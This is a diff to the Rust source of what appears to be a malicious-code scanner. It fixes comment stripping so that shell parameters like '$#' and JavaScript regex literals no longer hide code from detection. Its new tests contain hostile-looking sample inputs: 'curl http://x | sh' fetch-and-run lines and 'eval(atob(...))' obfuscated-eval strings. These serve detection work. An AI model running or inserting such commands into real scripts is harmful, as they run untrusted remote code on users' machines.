@@ -40,14 +40,39 @@ fn regex(pattern: &'static str) -> &'static Regex {
 enum CommentStyle {
     /// `//` and `/* ... */`
     CStyle,
-    /// `#` to end of line.
+    /// `#` to end of line, wherever it appears.
     Hash,
+    /// `#` to end of line only at line start or after whitespace, so `$#` and
+    /// `${#v}` in shell stay code.
+    Shell,
 }
 
 fn comment_style(extension: &str) -> CommentStyle {
     match extension {
-        "py" | "sh" | "bash" | "zsh" | "rb" => CommentStyle::Hash,
+        "sh" | "bash" | "zsh" => CommentStyle::Shell,
+        "py" | "rb" => CommentStyle::Hash,
         _ => CommentStyle::CStyle,
+    }
+}
+
+/// A `/` starts a regex literal (not division) after these tokens, or at the
+/// start of input. Recognising this keeps `/[//]/` from opening a comment.
+fn starts_regex(out: &str) -> bool {
+    let trimmed = out.trim_end();
+    match trimmed.chars().last() {
+        None => true,
+        Some('(' | ',' | '=' | ':' | '[' | '!' | '&' | '|' | '?' | '{' | '}' | ';') => true,
+        Some(_) => {
+            let word: String = trimmed
+                .chars()
+                .rev()
+                .take_while(|character| character.is_alphanumeric() || *character == '_')
+                .collect::<Vec<_>>()
+                .into_iter()
+                .rev()
+                .collect();
+            matches!(word.as_str(), "return" | "typeof")
+        }
     }
 }
 
@@ -101,7 +126,42 @@ fn strip_comments(text: &str, style: CommentStyle) -> String {
                 block = true;
                 out.push_str("  ");
             }
+            '/' if style == CommentStyle::CStyle && starts_regex(&out) => {
+                out.push('/');
+                let mut class = false;
+                let mut regex_escape = false;
+                for next in chars.by_ref() {
+                    out.push(next);
+                    if regex_escape {
+                        regex_escape = false;
+                        continue;
+                    }
+                    match next {
+                        '\\' => regex_escape = true,
+                        '[' => class = true,
+                        ']' => class = false,
+                        '/' if !class => break,
+                        '\n' => break,
+                        _ => {}
+                    }
+                }
+            }
             '#' if style == CommentStyle::Hash => {
+                out.push(' ');
+                for next in chars.by_ref() {
+                    if next == '\n' {
+                        out.push('\n');
+                        break;
+                    }
+                    out.push(' ');
+                }
+            }
+            '#' if style == CommentStyle::Shell
+                && out
+                    .chars()
+                    .last()
+                    .is_none_or(|previous| previous.is_whitespace()) =>
+            {
                 out.push(' ');
                 for next in chars.by_ref() {
                     if next == '\n' {
@@ -492,6 +552,34 @@ mod tests {
         ExtractedFile {
             path: path.to_string(),
             text: text.to_string(),
+        }
+    }
+
+    #[test]
+    fn regex_literals_do_not_start_comments() {
+        for text in [
+            r#"var r = /\/*/; eval(atob("x"))"#,
+            r#"/[//]/.test(a); eval(atob("x"))"#,
+        ] {
+            let findings = scan(&[file("lib/x.js", text)]);
+            assert!(
+                findings.iter().any(|finding| finding.rule == "JS-OBF-001"),
+                "{text}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_hash_inside_parameters_is_not_a_comment() {
+        for text in [
+            "[ $# -gt 0 ] && curl http://x | sh",
+            "n=${#v}; curl http://x | sh",
+        ] {
+            let findings = scan(&[file("install.sh", text)]);
+            assert!(
+                findings.iter().any(|finding| finding.rule == "SH-PIPE-001"),
+                "{text}: {findings:?}"
+            );
         }
     }
 
